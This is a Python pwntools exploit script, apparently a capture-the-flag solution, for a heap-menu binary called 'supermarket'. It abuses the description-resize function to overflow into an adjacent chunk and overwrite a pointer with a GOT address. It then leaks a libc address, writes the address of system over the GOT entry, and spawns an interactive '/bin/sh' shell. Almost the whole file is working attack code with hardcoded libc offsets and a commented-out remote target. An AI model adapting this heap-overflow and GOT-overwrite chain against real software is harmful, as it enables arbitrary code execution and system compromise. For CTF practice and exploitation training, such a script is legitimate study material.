#!/usr/bin env python

from pwn import*

context.log_level = 'debug'


#  p =remote('111.198.29.45',40653)
p = process("./supermarket")

def add(name,price,descrip_size,description):
    p.recvuntil("your choice>> ")
    p.sendline("1")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("price:")
    p.sendline(str(price))
    p.recvuntil("descrip_size:")
    p.sendline(str(descrip_size))
    p.recvuntil("description:")
    p.sendline(description)

def free(name):
    p.recvuntil("your choice>> ")
    p.sendline("2")
    p.recvuntil("name:")
    p.sendline(name)

def change_price(name,price):
    p.recvuntil("your choice>> ")
    p.sendline("4")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("input the value you want to cut or rise in:")
    p.sendline(str(price))


def change_des(name,descrip_size,description):
    p.recvuntil("your choice>> ")
    p.sendline("5")
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("descrip_size:")
    p.sendline(str(descrip_size))
    p.recvuntil("description:")
    p.sendline(description)




def list():
    p.recvuntil("your choice>> ")
    p.sendline("3")

got = 0x804b038#0x804b038

add("A",0x10,0x100,"AAAA")    

change_des("A",8,"C"*7+"\x00")
add("B",0x10,0x100,"BBBB")


payload = "B"*12+ p32(0x21) + p32(0x42) + "B"*12 + p32(0x00) +p32(0x100) +p32(got)

change_des('A',100,payload+'\n')
list()

p.recvuntil("B: price.0, des.")
addr = p.recvn(4)

print"addr:",hex(u32(addr))

libc = u32(addr) - 0x18540#0x49020
system_addr = libc + 0x3a940

print"libc:",hex(libc)
print"system_addr:",hex(system_addr)

change_des("B",0x100,p32(system_addr)*5)#+'\n'

p.send('/bin/sh\x00')
p.interactive()
